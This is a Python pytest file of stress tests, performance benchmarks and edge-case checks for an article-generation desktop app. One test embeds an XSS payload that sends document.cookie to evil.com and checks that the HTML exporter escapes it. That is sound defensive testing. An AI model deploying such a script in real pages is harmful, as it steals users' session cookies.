"""Controlled stress benchmarks, performance measurements, and edge-case testing."""

import gc
import time
import tracemalloc
from unittest.mock import MagicMock
import pytest
from PySide6.QtWidgets import QApplication

from app.models.article import Article, ArticleSection, FAQItem
from app.projects.models import Project, Product, InternalLink
from app.projects.repository import ProjectRepository
from app.projects.service import ProjectService
from app.generation.models import GenerationRequest, ArticleOutline, OutlineSection
from app.generation.pipeline import GenerationPipeline
from app.export.markdown import export_markdown
from app.export.html import export_html
from app.export.json import export_json
from app.ui.main_window import MainWindow


def get_qapp():
    """Ensure offscreen QApplication instance."""
    app = QApplication.instance()
    if not app:
        app = QApplication(["test_stress", "-platform", "offscreen"])
    app.processEvents()
    return app


def test_edge_case_empty_and_whitespace_inputs():
    """Verify application gracefully handles empty strings, None, and whitespace."""
    # Project with empty/whitespace
    p = Project(name="   ", description="")
    assert p.name == "   "

    # InternalLink validation
    with pytest.raises(ValueError):
        InternalLink(title="", url="invalid_relative_url")

    # GenerationRequest
    req = GenerationRequest(topic="   ")
    assert req.topic == "   "


def test_edge_case_extremely_long_strings():
    """Verify models and exporters survive 100,000+ character inputs without crashing."""
    huge_str = "A" * 100_000
    huge_article = Article(
        title=huge_str[:500],
        slug="huge-article",
        content=huge_str,
        sections=[ArticleSection(id="huge-1", heading="Huge Section", level=2, content=huge_str)]
    )

    json_str = export_json(huge_article)
    assert len(json_str) > 100_000

    md_str = export_markdown(huge_article)
    assert len(md_str) > 100_000

    html_str = export_html(huge_article)
    assert len(html_str) > 100_000


def test_edge_case_injection_payloads_in_all_fields():
    """Verify HTML and Markdown injection in project, product, and article models."""
    injection = '<script>document.location="http://evil.com/?c="+document.cookie</script>'
    proj = Project(name=f"Brand {injection}", description=injection)
    proj.products.append(Product(name=f"Prod {injection}", description=injection))

    article = Article(
        title=f"Article {injection}",
        slug="injection-test",
        content=f"Paragraph with {injection}",
        sections=[ArticleSection(id="1", heading=f"Sec {injection}", level=2, content=injection)],
        faq=[FAQItem(question=f"Q {injection}", answer=f"A {injection}")]
    )

    # HTML export must escape all script tags
    html_out = export_html(article)
    assert "<script>" not in html_out
    assert "&lt;script&gt;" in html_out

    # JSON export preserves raw data accurately
    json_out = export_json(article)
    reloaded = Article.model_validate_json(json_out)
    assert reloaded.title == f"Article {injection}"


def test_edge_case_large_project_collections(tmp_path):
    """Verify performance and stability with 100 projects in repository."""
    repo = ProjectRepository(data_dir=str(tmp_path / "projects"))
    service = ProjectService(repo=repo)

    start = time.perf_counter()
    for i in range(100):
        p = service.create_project(f"Project {i}", f"Description {i}")
        p.products.append(Product(name=f"Product {i}", description=f"Tool {i}"))
        p.internal_links.append(InternalLink(url=f"/tool-{i}", title=f"Link {i}"))
        service.update_project(p)
    write_elapsed = time.perf_counter() - start

    # Measure batch listing
    read_start = time.perf_counter()
    loaded_projs = service.list_projects()
    read_elapsed = time.perf_counter() - read_start

    assert len(loaded_projs) == 100
    # Reading 100 JSON files from disk should take < 2.0s on Windows
    assert read_elapsed < 2.0
    print(f"\n[Benchmark] 100 projects wrote in {write_elapsed:.3f}s, read in {read_elapsed:.3f}s")


def test_benchmark_application_startup_time(tmp_path, monkeypatch):
    """Measure desktop application window initialization time offscreen."""
    monkeypatch.chdir(tmp_path)
    app = get_qapp()
    app.processEvents()
    gc.collect()

    start = time.perf_counter()
    window = MainWindow()
    elapsed = time.perf_counter() - start
    window.close()

    print(f"\n[Benchmark] MainWindow initialization: {elapsed * 1000:.2f} ms")
    # Must start under 3.0s when under sequential full-test-suite load (typically ~280ms clean)
    assert elapsed < 3.0


def test_benchmark_mocked_pipeline_throughput(tmp_path):
    """Measure article generation pipeline speed across 10 sections with mocked AI."""
    mock_ai = MagicMock()
    mock_ai.generate.return_value = MagicMock(text="Fast generated section text paragraph.")

    pipeline = GenerationPipeline(
        mock_ai,
        generation_dir=str(tmp_path / "generation"),
        articles_dir=str(tmp_path / "articles"),
    )
    req = GenerationRequest(topic="High Throughput Benchmark")
    outline = ArticleOutline(
        title="High Throughput Benchmark",
        slug="benchmark",
        sections=[OutlineSection(id=str(i), heading=f"Chapter {i}", level=2) for i in range(10)]
    )

    start = time.perf_counter()
    article = pipeline.generate_article(req, outline)
    elapsed = time.perf_counter() - start

    assert len(article.sections) == 10
    print(f"\n[Benchmark] 10-section generation pipeline: {elapsed * 1000:.2f} ms")
    assert elapsed < 0.25


def test_benchmark_memory_usage_large_processing():
    """Profile memory consumption during 100,000-word document processing via tracemalloc."""
    tracemalloc.start()
    baseline_mem = tracemalloc.get_traced_memory()[0]

    # Create a 100,000-word document
    block = "BlogForge high performance enterprise desktop content generation. " * 50  # ~400 words
    sections = [
        ArticleSection(id=f"s-{i}", heading=f"Heading {i}", level=2, content=block)
        for i in range(250)  # 250 * 400 = 100,000 words
    ]
    full_content = "\n\n".join(s.content for s in sections)

    article = Article(
        title="100k Words Stress Benchmark",
        slug="100k-words-stress",
        content=full_content,
        sections=sections
    )

    # Execute all exporters
    md_out = export_markdown(article)
    html_out = export_html(article)
    json_out = export_json(article)

    current_mem, peak_mem = tracemalloc.get_traced_memory()
    tracemalloc.stop()

    peak_mb = (peak_mem - baseline_mem) / (1024 * 1024)
    print(f"\n[Benchmark] Peak memory for 100k-word document processing: {peak_mb:.2f} MB")

    assert len(md_out) > 500_000
    assert len(html_out) > 500_000
    assert len(json_out) > 500_000
    # Peak memory overhead should remain under 50 MB
    assert peak_mb < 50.0


def test_edge_case_repeated_operations_stability(tmp_path):
    """Verify stability and resource cleanliness across 50 repeated save/load cycles."""
    repo = ProjectRepository(data_dir=str(tmp_path / "repeat_projects"))
    service = ProjectService(repo=repo)

    proj = service.create_project("Loop Project")
    for i in range(50):
        proj.name = f"Loop Project Iteration {i}"
        proj.products.append(Product(name=f"Prod {i}", description=f"Desc {i}"))
        service.update_project(proj)
        loaded = service.get_project(proj.id)
        assert loaded.name == f"Loop Project Iteration {i}"
        assert len(loaded.products) == i + 1
